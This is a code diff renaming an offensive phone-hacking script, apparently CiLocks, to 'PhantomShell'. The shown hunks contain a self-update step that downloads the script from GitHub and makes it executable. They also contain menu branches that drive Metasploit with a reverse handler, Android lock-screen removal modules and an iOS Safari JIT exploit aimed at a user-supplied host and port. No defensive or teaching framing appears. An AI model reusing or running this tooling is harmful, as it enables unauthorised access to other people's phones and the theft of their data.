@@ -103,9 +103,9 @@ if [[ $select == 1 ]]; then
   rm -f "${path}/data/config" >/dev/null 2>&1
   rm -f "${path}/data/os" >/dev/null 2>&1
   # update new release
-  wget https://raw.githubusercontent.com/tegal1337/CiLocks/main/cilocks -O "${path}/cilocks" >/dev/null 2>&1
-  wget https://raw.githubusercontent.com/tegal1337/CiLocks/main/data/config -O "${path}/data/config" >/dev/null 2>&1
-  wget https://raw.githubusercontent.com/tegal1337/CiLocks/main/data/os -O "${path}/data/os" >/dev/null 2>&1
+  wget https://raw.githubusercontent.com/tegal1337/PhantomShell/main/cilocks -O "${path}/cilocks" >/dev/null 2>&1
+  wget https://raw.githubusercontent.com/tegal1337/PhantomShell/main/data/config -O "${path}/data/config" >/dev/null 2>&1
+  wget https://raw.githubusercontent.com/tegal1337/PhantomShell/main/data/os -O "${path}/data/os" >/dev/null 2>&1
   # give permission
   chmod +x "${path}/cilocks" >/dev/null 2>&1
   chmod +x "${path}/data/config" >/dev/null 2>&1
@@ -405,28 +405,28 @@ elif [[ $select == 3 ]]; then
     read -p "LPORT: " port
     msfconsole=msfconsole
     exploit='use exploit/multi/handler'
-    xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"
+    xterm -T " PhantomShell Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"
 
   elif [[ $select == 2 ]]; then
     read -p "LHOST: " host
     read -p "LPORT: " port
     msfconsole=msfconsole
     exploit='use post/android/manage/remove_lock'
-    xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"
+    xterm -T " PhantomShell Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"
 
   elif [[ $select == 3 ]]; then
     read -p "LHOST: " host
     read -p "LPORT: " port
     msfconsole=msfconsole
     exploit='use post/android/manage/remove_lock_root'
-    xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"
+    xterm -T " PhantomShell Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"
 
   elif [[ $select == 4 ]]; then
     read -p "LHOST: " host
     read -p "LPORT: " port
     msfconsole=msfconsole
     exploit='use exploit/apple_ios/browser/safari_jit'
-    xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload2 ; set lhost $host ; set lport $port; exploit; exit -y'"
+    xterm -T " PhantomShell Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload2 ; set lhost $host ; set lport $port; exploit; exit -y'"
   fi
 
 elif [[ $select == 4 ]]; then
